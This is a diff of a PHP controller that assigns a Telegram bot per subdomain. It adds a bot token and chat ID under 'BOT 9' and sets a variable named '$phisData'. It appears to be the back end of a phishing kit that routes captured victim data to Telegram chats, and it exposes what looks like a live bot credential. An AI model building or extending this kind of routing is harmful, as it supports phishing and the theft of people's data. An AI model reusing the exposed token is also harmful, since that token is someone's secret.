@@ -103,8 +103,8 @@ class HomeController extends Controller
             $phisData = "MY8";
         } else  if ($subdomain == "live-vc-private1-my9") {
             // BOT 9
-            $bot_token = "";
-            $chat_id = "";
+            $bot_token = "7725644706:AAED4xmptLbmRse_yX1jjL0ElhDEuhDUCkc";
+            $chat_id = "6243136404";
             $phisData = "MY9";
         } else  if ($subdomain == "live-vc-private1-my10") {
             // BOT 10
